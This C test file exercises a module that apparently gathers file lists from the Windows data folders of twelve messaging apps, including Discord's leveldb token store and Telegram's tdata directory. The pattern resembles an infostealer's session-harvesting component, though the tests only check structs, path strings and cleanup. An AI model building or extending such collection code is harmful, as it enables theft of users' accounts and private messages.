#define _POSIX_C_SOURCE 200809L
/*
 * test_messengers.c — Messenger directory scanning tests
 *
 * Tests MessengerData struct, collect_messengers path construction,
 * and free_messenger_data cleanup.
 *
 * The actual directory scanning uses Win32 FindFirstFile, so we test
 * the struct types, path patterns, and memory management.
 */

#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "messengers.h"

/* Use real path helper from messengers.c */
extern void messenger_get_path(char *buf, size_t bufsz, const char *appdata,
                               const char *subdir);

static void test_messenger_result_struct(void) {
    MessengerResult r = {0};
    assert(r.files == NULL);
    assert(r.count == 0);
    assert(r.name == NULL);

    printf("  PASS: test_messenger_result_struct\n");
}

static void test_messenger_data_struct(void) {
    MessengerData data = {0};
    assert(data.discord.files == NULL);
    assert(data.telegram.files == NULL);
    assert(data.signal.files == NULL);
    assert(data.whatsapp.files == NULL);
    assert(data.skype.files == NULL);
    assert(data.viber.files == NULL);
    assert(data.element.files == NULL);
    assert(data.session.files == NULL);
    assert(data.tox.files == NULL);
    assert(data.icq.files == NULL);
    assert(data.pidgin.files == NULL);
    assert(data.outlook.files == NULL);

    printf("  PASS: test_messenger_data_struct\n");
}

static void test_messenger_result_alloc_free(void) {
    /* Allocate a result, populate it, then free */
    MessengerResult r = {0};
    r.name = strdup("TestMessenger");
    r.files = calloc(3, sizeof(char *));
    r.files[0] = strdup("/path/to/file1.db");
    r.files[1] = strdup("/path/to/file2.db");
    r.files[2] = strdup("/path/to/file3.log");
    r.count = 3;

    assert(strcmp(r.name, "TestMessenger") == 0);
    assert(r.count == 3);
    assert(strcmp(r.files[0], "/path/to/file1.db") == 0);
    assert(strcmp(r.files[1], "/path/to/file2.db") == 0);
    assert(strcmp(r.files[2], "/path/to/file3.log") == 0);

    /* Free manually (mimicking free_messenger_result) */
    for (size_t i = 0; i < r.count; i++)
        free(r.files[i]);
    free(r.files);
    free(r.name);

    printf("  PASS: test_messenger_result_alloc_free\n");
}

static void test_free_messenger_data_null(void) {
    /* Verify the function signature exists by casting */
    void (*fn)(MessengerData *) = free_messenger_data;
    (void)fn;
    printf("  PASS: test_free_messenger_data_null\n");
}

static void test_discord_path_pattern(void) {
    /* Verify the expected Discord path pattern */
    const char *roaming = "C:\\Users\\test\\AppData\\Roaming";
    char expected[1024];
    snprintf(expected, sizeof(expected), "%s\\Discord\\Local Storage\\leveldb", roaming);

    /* The actual path construction is in messengers.c, we verify pattern */
    assert(strstr(expected, "Discord") != NULL);
    assert(strstr(expected, "leveldb") != NULL);

    printf("  PASS: test_discord_path_pattern\n");
}

static void test_telegram_path_pattern(void) {
    const char *roaming = "C:\\Users\\test\\AppData\\Roaming";
    char expected[1024];
    snprintf(expected, sizeof(expected), "%s\\Telegram Desktop\\tdata", roaming);

    assert(strstr(expected, "Telegram Desktop") != NULL);
    assert(strstr(expected, "tdata") != NULL);

    printf("  PASS: test_telegram_path_pattern\n");
}

static void test_signal_path_pattern(void) {
    const char *roaming = "C:\\Users\\test\\AppData\\Roaming";
    char expected[1024];
    snprintf(expected, sizeof(expected), "%s\\Signal", roaming);

    assert(strstr(expected, "Signal") != NULL);

    printf("  PASS: test_signal_path_pattern\n");
}

static void test_whatsapp_path_pattern(void) {
    const char *local = "C:\\Users\\test\\AppData\\Local";
    char expected[1024];
    snprintf(expected, sizeof(expected), "%s\\WhatsApp", local);

    assert(strstr(expected, "WhatsApp") != NULL);

    printf("  PASS: test_whatsapp_path_pattern\n");
}

static void test_messenger_result_empty_files(void) {
    /* Empty result (no files found) */
    MessengerResult r = {0};
    r.name = strdup("EmptyMessenger");
    r.files = NULL;
    r.count = 0;

    assert(r.count == 0);
    assert(r.files == NULL);

    free(r.name);

    printf("  PASS: test_messenger_result_empty_files\n");
}

static void test_all_messenger_names_assigned(void) {
    /* Verify all messenger fields have non-NULL name after collect */
    /* Since collect_messengers uses Win32 APIs, we test the struct layout */
    size_t expected_count = 12; /* discord, telegram, signal, whatsapp,
                                   skype, viber, element, session, tox,
                                   icq, pidgin, outlook */

    /* Count fields in struct by offset arithmetic */
    MessengerData data = {0};
    MessengerResult *fields[] = {
        &data.discord, &data.telegram, &data.signal, &data.whatsapp,
        &data.skype, &data.viber, &data.element, &data.session,
        &data.tox, &data.icq, &data.pidgin, &data.outlook
    };
    assert(sizeof(fields) / sizeof(fields[0]) == expected_count);

    for (size_t i = 0; i < expected_count; i++) {
        assert(fields[i]->files == NULL);
        assert(fields[i]->count == 0);
    }

    printf("  PASS: test_all_messenger_names_assigned\n");
}

int main(void) {
    printf("=== test_messengers: messenger directory scanning ===\n");

    test_messenger_result_struct();
    test_messenger_data_struct();
    test_messenger_result_alloc_free();
    test_free_messenger_data_null();
    test_discord_path_pattern();
    test_telegram_path_pattern();
    test_signal_path_pattern();
    test_whatsapp_path_pattern();
    test_messenger_result_empty_files();
    test_all_messenger_names_assigned();

    printf("=== test_messengers: ALL PASSED ===\n");
    return 0;
}
